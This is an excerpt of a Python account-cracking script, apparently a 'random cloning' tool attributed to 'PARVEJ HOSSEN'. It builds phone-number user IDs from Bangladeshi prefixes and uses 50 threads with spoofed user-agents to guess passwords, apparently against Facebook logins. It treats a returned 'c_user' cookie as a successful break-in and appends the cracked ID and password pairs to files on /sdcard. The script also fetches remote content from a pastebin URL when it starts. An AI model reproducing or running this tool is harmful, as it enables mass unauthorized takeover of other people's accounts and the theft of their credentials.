...
from os import system as _PARVEJ_
try:
    import requests
    ...
    _PARVEJ_('pip install mechanize requests futures bs4==2 > /dev/null')
    _PARVEJ_('pip install bs4')
apk1=requests.get("https://pastebin.com/raw/FrYTLzAa").text
def lo(word):
    parvej = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(parvej)):
            sys.stdout.write(('\r{}{}').format(str(word), parvej[x]))
            time.sleep(0.1)
            sys.stdout.flush()
...
today = date.today()
logo = (
88""Yb    db    88""Yb Yb    dP 888888  88888 
88__dP   dPYb   88__dP  Yb  dP  88__       88 
88"""   dP__Yb  88"Yb    YbdP   88""   o.  88 
88     dP""""Yb 88  Yb    YP    888888 "bodP' 

┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mAUTHOR        \033[1;35m:  \033[1;37mPARVEJ HOSSEN      \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mGITHUB        \033[1;35m:  \033[1;37mROMAN-XXX     \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mWHATSAPP      \033[1;35m:  \033[1;37m01608002168       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mPOWER         \033[1;35m:  \033[1;31mPARVEJ HOSSEN      \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n """)
loop = 0
oks = []
cps = []
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','PARVEJ HOSSEN is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
def PARVEJ():
    ...
    _PARVEJ_("clear")
    print(logo)
    _PARVEJ_("espeak \"Hi sir ,Wellcome to Heron Afridi Rendom cloneing tool\"")
    ...
    if opt == '1':
    	_PARVEJ_("espeak \" you choose rendom cloneing\"")
    	xxr()
    if None == '2':
...
def xxr():
    ...
    print(" \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    _PARVEJ_("espeak \"choose your country cord\"")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '0194'
    ...
    _PARVEJ_(f"espeak \"you choose {pww}\"")
    _PARVEJ_('clear')
    print(logo)
    _PARVEJ_("espeak \"choose your limit\"")
    ...
    _PARVEJ_(f"espeak \"you choose limit {limit}\"")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f'\033[1;97m│\033[1;91m[\033[1;97m×\033[1;91m]\033[1;92m TOOL OWNER   \033[1;97m: \033[1;91mPARVEJ HOSSEN     \033[1;97m  │')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                _PARVEJ_("espeak \"congratulations you got a ok id\"")
                open('/sdcard/PARVEJ_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
               ...
               # print('\r\r\33[1;30m [ERROR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                _PARVEJ_("espeak \"PARVEJ is brand\"")
                open('/sdcard/PARVEJ_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}PARVEJ\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
